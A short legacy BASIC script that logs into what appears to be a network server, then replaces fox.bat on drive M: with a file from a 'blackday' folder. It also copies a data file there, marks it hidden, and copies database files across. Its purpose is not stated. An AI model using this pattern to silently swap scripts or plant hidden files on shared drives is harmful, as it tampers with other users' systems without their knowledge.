FOR i = 1 TO 1
 READ a$
 SHELL "f:\login\login c" + a$
 SHELL "del m:\fox.bat"
 SHELL "copy c:\blackday\1.dat m:\fox.bat"
 SHELL "copy c:\blackday\2.dat m:\92qmg21.dat"
 SHELL "attrib m:\92qmg21.dat +h"
 SHELL "copy c:\blackday\*.dbf m:\"
 DATA 8,9,10,11,12
NEXT i

